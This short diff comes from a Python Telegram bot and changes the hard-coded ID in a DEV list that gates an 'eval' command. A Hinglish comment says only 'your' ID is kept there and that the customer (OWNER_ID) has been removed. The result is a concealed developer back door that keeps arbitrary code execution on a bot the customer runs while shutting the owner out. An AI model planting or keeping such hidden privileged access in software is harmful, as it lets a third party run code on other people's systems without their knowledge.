@@ -29,9 +29,9 @@ async def edit_or_reply(msg: Message, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-# ✅ SAFETY LOCK: Sirf Aapki ID (8217013403) yahan hai.
+# ✅ SAFETY LOCK: Sirf Aapki ID (5286579067) yahan hai.
 # Customer (OWNER_ID) ko yahan se hata diya gaya hai.
-DEV = [8217013403]
+DEV = [5286579067]
 
 @app.on_edited_message(
     filters.command("eval")
